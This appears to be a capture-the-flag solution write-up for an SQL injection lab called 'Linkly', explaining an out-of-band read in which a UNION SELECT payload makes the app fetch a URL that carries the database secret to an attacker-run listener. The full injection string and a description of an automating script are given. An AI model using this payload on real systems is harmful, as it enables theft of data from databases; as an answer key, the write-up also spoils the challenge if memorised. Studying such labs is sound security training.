# Solution — sqli7 (Linkly)

Out-of-band read. The preview page builds

    SELECT url, note, id FROM links WHERE id = <n>

by concatenation, and the app then performs a real `GET` on every URL the
query returns. So the database secret can be carried out on the *path*
column of a row we inject:

1. Run any listener on the machine you attack from (solve.py uses a small
   `http.server` on port 9900). Find the address the challenge container
   can reach you at — for the lab, the podman bridge gateway
   (`podman network inspect podman`, e.g. `10.88.0.1`).
2. Visit (spaces/quotes URL-encoded):

   `/l/0 UNION SELECT 'http://10.88.0.1:9900/?d=' || secret, 'x', 0 FROM vault --`

   `id = 0` matches nothing, so the only preview row is the UNION one: its
   `url` becomes `http://10.88.0.1:9900/?d=flag{...}` and Linkly fetches it
   for you.
3. Read the `d` query parameter from the request your listener received.

If the challenge container is network-isolated from your box (some
nested lab VMs), `solve.py` falls back to running the listener inside
the container's own netns via `podman exec` and reads the hit back from
a file on the app tmpfs — same mechanics, closed loop.

`solve.py` automates all of it: it starts the receiver, discovers the bridge
IP, sends the payload and prints the flag.
